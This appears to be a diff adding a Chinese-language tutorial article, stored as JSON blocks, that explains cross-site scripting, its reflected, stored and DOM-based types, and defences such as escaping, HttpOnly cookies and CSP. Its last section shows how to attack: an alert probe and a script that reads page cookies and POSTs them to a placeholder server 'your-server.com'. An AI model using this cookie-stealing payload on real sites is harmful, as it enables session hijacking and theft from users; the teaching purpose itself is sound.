@@ -1,0 +1,138 @@
+{
+  "format": "blocks",
+  "no": "006",
+  "category": "网络安全",
+  "title": "XSS(Cross-Site-Scripting)跨站脚本攻击",
+  "date": "2026-06-30",
+  "readingMinutes": 5,
+  "words": 1600,
+  "excerpt": "是一种常见的Web安全漏洞，攻击者利用Web应用程序对用户输入检查不足的漏洞，将恶意脚本注入到网页中。当用户访问这些网页时，恶意脚本会在用户的浏览器中执行，从而窃取用户数据、弹出广告或篡改网页内容。",
+  "body": [
+    {
+      "type": "p",
+      "text": "是一种常见的Web安全漏洞，攻击者利用Web应用程序对用户输入检查不足的漏洞，将恶意脚本注入到网页中。当用户访问这些网页时，恶意脚本会在用户的浏览器中执行，从而窃取用户数据、弹出广告或篡改网页内容。"
+    },
+    {
+      "type": "h2",
+      "text": "XSS的工作原理"
+    },
+    {
+      "type": "p",
+      "text": "XSS攻击的基本过程如下："
+    },
+    {
+      "type": "list",
+      "ordered": true,
+      "items": [
+        {
+          "text": "攻击者发现存在漏洞的网站，并在网页中注入恶意脚本。",
+          "level": 0
+        }
+      ]
+    },
+    {
+      "type": "list",
+      "ordered": true,
+      "items": [
+        {
+          "text": "当用户访问该网站时，恶意脚本被加载到浏览器中并执行。",
+          "level": 0
+        }
+      ]
+    },
+    {
+      "type": "list",
+      "ordered": true,
+      "items": [
+        {
+          "text": "恶意脚本可以访问浏览器中的Cookie、会话令牌等敏感信息，甚至可以改写页面内容。",
+          "level": 0
+        }
+      ]
+    },
+    {
+      "type": "h2",
+      "text": "常见的XSS类型"
+    },
+    {
+      "type": "h3",
+      "text": "反射型XSS"
+    },
+    {
+      "type": "p",
+      "text": "反射型XSS是最常见和最简单的攻击形式。恶意脚本作为客户端请求的一部分提交给服务器，服务器解析后在响应中返回脚本，由浏览器执行。攻击者通常通过钓鱼邮件或弹窗链接引诱用户点击。"
+    },
+    {
+      "type": "h3",
+      "text": "存储型XSS"
+    },
+    {
+      "type": "p",
+      "text": "存储型XSS是最具破坏性的攻击形式。恶意脚本被永久存储在服务器上，如数据库或文件系统中。每次用户访问网页时，恶意脚本都会被加载并执行。"
+    },
+    {
+      "type": "h3",
+      "text": "基于DOM的XSS"
+    },
+    {
+      "type": "p",
+      "text": "基于DOM的XSS通过篡改DOM注入恶意脚本。整个攻击过程在用户侧浏览器执行，无需服务器端解析和响应。"
+    },
+    {
+      "type": "h2",
+      "text": "防止XSS攻击的方法"
+    },
+    {
+      "type": "list",
+      "ordered": true,
+      "items": [
+        {
+          "text": "输入验证和过滤：对用户输入进行验证和过滤，确保输入符合预期格式，过滤掉特殊字符和标签。",
+          "level": 0
+        },
+        {
+          "text": "输入转义：在呈现用户输入之前，对其进行转义，防止恶意脚本被解释为可执行代码。",
+          "level": 0
+        },
+        {
+          "text": "安全Cookie：设置HttpOnly属性，防止JavaScript读取Cookie。",
+          "level": 0
+        },
+        {
+          "text": "内容安全策略（CSP）：使用HTTP响应头CSP限制可以被加载和执行的资源。",
+          "level": 0
+        },
+        {
+          "text": "渗透测试：对Web程序进行渗透测试，加固跨站脚本漏洞。",
+          "level": 0
+        }
+      ]
+    },
+    {
+      "type": "h2",
+      "text": "进行XSS攻击的方法"
+    },
+    {
+      "type": "p",
+      "text": "寻找网站中存在输入交互的地方，输入`<script>alert('a');</script>`这样的js代码，提交看是否会被拦截，或看是否有回显效果"
+    },
+    {
+      "type": "code",
+      "lang": "javascript",
+      "text": "//示例：获取cookie并序列化为键值对输出\n//使用document.cookie获取当前页面上的所有cookie\nfunction parseCookies() {\n   const cookieArray = document.cookie.split(\"; \");\n   const cookieObject = {};\n   cookieArray.forEach(cookie => {\n       const [key, value] = cookie.split(\"=\");\n       cookieObject[key] = value;\n   });\n   return cookieObject;\n}\n\n// 示例：解析并打印所有 Cookie\nconsole.log(parseCookies());"
+    },
+    {
+      "type": "p",
+      "text": "配合fetch传递："
+    },
+    {
+      "type": "code",
+      "lang": "javascript",
+      "text": "// 获取当前页面所有 Cookie 并发送到远程服务器\n(function() {\n    const cookies = document.cookie;\n    const targetUrl = 'https://your-server.com/api/collect'; // Your server address\n    \n    fetch(targetUrl, {\n        method: 'POST',\n        headers: {\n            'Content-Type': 'application/json'\n        },\n        body: JSON.stringify({\n            url: window.location.href,\n            cookies: cookies,\n            timestamp: new Date().toISOString(),\n            userAgent: navigator.userAgent\n        }),\n        // 注意：如果目标服务器跨域，需要服务器支持 CORS\n        mode: 'cors'\n    })\n    .then(response => console.log('发送成功:', response.status))\n    .catch(error => console.error('发送失败:', error));\n})();"
+    },
+    {
+      "type": "quote",
+      "text": "有些网站可能会对输入的内容做长度限制，如果只是在前端的限制，那么可以尝试在页面的js文件中修改绕过限制  \n如果是对于后端进行的防护，那么一般来说是无能为力的"
+    }
+  ]
+}
